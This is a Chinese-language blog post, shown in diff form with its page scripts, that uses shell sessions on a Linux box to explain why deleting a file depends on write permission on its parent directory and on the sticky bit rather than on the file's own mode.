+<p>为什么ssh-banner能够删除属组为root权限为777的文件，www-data却不能，同样的如果在tmp目录下以root身份创建同样权限的文件，为什么ssh-banner用户就也删不掉了，这里涉及比较细的权限知识</p>
+<p>可以看如下例子</p>
+<pre class="notranslate"><code class="notranslate">www-data@Word:/home/ssh-banner$ ls -al | grep banner.txt
+-rwxrwxrwx 1 root       root          0 Nov 15 21:12 banner.txt
+www-data@Word:/home/ssh-banner$ rm -f banner.txt
+rm: cannot remove 'banner.txt': Permission denied
+</code></pre>
+<pre class="notranslate"><code class="notranslate">ssh-banner@Word:~$ ls -al | grep banner.txt
+-rwxrwxrwx 1 root       root          0 Nov 15 21:12 banner.txt
+ssh-banner@Word:~$ rm -f banner.txt 
+ssh-banner@Word:~$ ls -al | grep banner.txt
+ssh-banner@Word:~$ 
+</code></pre>
+<pre class="notranslate"><code class="notranslate">root@Word:/tmp# touch test
+root@Word:/tmp# chmod 777 test
+root@Word:/tmp# ls -al | grep test 
+-rwxrwxrwx  1 root root    0 Nov 15 21:19 test
+root@Word:/tmp# su ssh-banner
+ssh-banner@Word:/tmp$ rm -f test 
+rm: cannot remove 'test': Operation not permitted
+ssh-banner@Word:/tmp$ exit
+exit
+root@Word:/tmp# su www-data
+www-data@Word:/tmp$ rm -f test 
+rm: cannot remove 'test': Operation not permitted
+www-data@Word:/tmp$ 
+</code></pre>
+<p>关键原因在于文件上级目录的<strong>写</strong>权限，与该文件的权限没有必然联系，同样目录下的文件夹也是同理</p>
+<p>这两个目录分别属于ssh-banner，以及root，可以看下面这个例子</p>
+<p>ssh-banner属组ssh-banner，ssh-banner用户具有rwx权限<br>
+test属组root，所有用户具有rwx权限<br>
+test1属组root，所以用户具有rwx权限，目录有Sticky Bit</p>
+<pre class="notranslate"><code class="notranslate">ssh-banner@Word:/home$ ls -al
+total 16
+drwxr-xr-x  4 root       root       4096 Nov 15 21:38 .
+drwxr-xr-x 18 root       root       4096 Mar 18  2025 ..
+drwxr-xr-x  2 ssh-banner ssh-banner 4096 Nov 15 21:33 ssh-banner   #1
+drwxrwxrwx  2 root       root       4096 Nov 15 21:47 test         #2
+drwxrwxrwt  2 root       root       4096 Nov 15 21:55 test1        #3
+</code></pre>
+<p>先看1与2的对比，在1，2目录下创建相同权限的text文件，并分别使用ssh-banner用户以及www-data用户删除文件</p>
+<pre class="notranslate"><code class="notranslate">root@Word:/home/test# ls -la text ;ls -al ../ssh-banner/text 
+-rw-r--r-- 1 root root 0 Nov 15 21:58 text
+-rw-r--r-- 1 root root 0 Nov 15 21:58 ../ssh-banner/text
+
+ssh-banner@Word:~$ rm -f text 
+ssh-banner@Word:~$ cd ../test
+ssh-banner@Word:/home/test$ rm -f text 
+
+
+www-data@Word:/home/test$ rm -f text 
+www-data@Word:/home/test$ cd ../ssh-banner/
+www-data@Word:/home/ssh-banner$ rm -f text 
+rm: cannot remove 'text': Permission denied
+
+</code></pre>
+<p>可以看到ssh-banner用户可以删除这两个文件，即使他只有对文件的读权限，同样www-data可以删除2下的文件，但是不能删除1下的文件</p>
+<p>现在给ssh-banner加777权限，同样即使加007权限，www-data也是可以删除的</p>
+<pre class="notranslate"><code class="notranslate">root@Word:/home# chmod 777 ssh-banner/
+root@Word:/home# ls -al 
+total 24
+drwxr-xr-x  6 root       root       4096 Nov 15 21:55 .
+drwxr-xr-x 18 root       root       4096 Mar 18  2025 ..
+drwxrwxrwx  2 ssh-banner ssh-banner 4096 Nov 15 22:01 ssh-banner
+drwxrwxrwx  2 root       root       4096 Nov 15 22:01 test
+drwxr-xr-x  2 root       root       4096 Nov 15 21:54 test1
+root@Word:/home# cd ssh-banner/
+root@Word:/home/ssh-banner# su www-data
+www-data@Word:/home/ssh-banner$ ls -al
+total 24
+drwxrwxrwx 2 ssh-banner ssh-banner 4096 Nov 15 22:01 .
+drwxr-xr-x 6 root       root       4096 Nov 15 21:55 ..
+lrwxrwxrwx 1 root       root          9 Nov 15 03:51 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 ssh-banner ssh-banner  220 Nov 14 21:59 .bash_logout
+-rw-r--r-- 1 ssh-banner ssh-banner 3526 Nov 14 21:59 .bashrc
+-rw-r--r-- 1 ssh-banner ssh-banner  807 Nov 14 21:59 .profile
+-rw-r--r-- 1 root       root          0 Nov 15 22:01 text
+-rw-r--r-- 1 root       root         44 Nov 14 22:10 user.txt
+www-data@Word:/home/ssh-banner$ rm -f text 
+www-data@Word:/home/ssh-banner$
+</code></pre>
+<p>再看2和3，所以用户均为rwx权限但是有Sticky Bit的区别</p>
+<pre class="notranslate"><code class="notranslate">root@Word:/home# ls -al
+total 20
+drwxr-xr-x  5 root       root       4096 Nov 15 22:08 .
+drwxr-xr-x 18 root       root       4096 Mar 18  2025 ..
+drwxrwxrwx  2 ssh-banner ssh-banner 4096 Nov 15 22:06 ssh-banner
+drwxrwxrwx  2 root       root       4096 Nov 15 22:01 test
+drwxrwxrwt  2 root       root       4096 Nov 15 21:54 test1
+root@Word:/home# touch test/text &amp;&amp; touch test1/text
+root@Word:/home# ls -al test/text &amp;&amp; ls test1/text -al
+-rw-r--r-- 1 root root 0 Nov 15 22:09 test/text
+-rw-r--r-- 1 root root 0 Nov 15 22:09 test1/text
+
+root@Word:/home# su www-data
+www-data@Word:/home$ rm -f test/text &amp;&amp; rm -f test1/text 
+rm: cannot remove 'test1/text': Operation not permitted
+www-data@Word:/home$ ls test -al
+total 8
+drwxrwxrwx 2 root root 4096 Nov 15 22:10 .
+drwxr-xr-x 5 root root 4096 Nov 15 22:08 ..
+www-data@Word:/home$ touch test1/text_wd
+www-data@Word:/home$ rm -f test1/text_wd 
+</code></pre>
+<p>仍然无法删除，但是自己的文件可以删除</p>
+<p>==**所以，用户是否能删除本级目录下的文件以及目录，影响因素是该用户是否具有本级目录的写权限，以及本级目录是否具有Sticky Bit限制，与其他的无关包括文件本身的权限均无关，如果具有Sticky Bit限制则只能删除属于自己的文件</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://faabbi.github.io">MJ</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","faabbi/faabbi.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
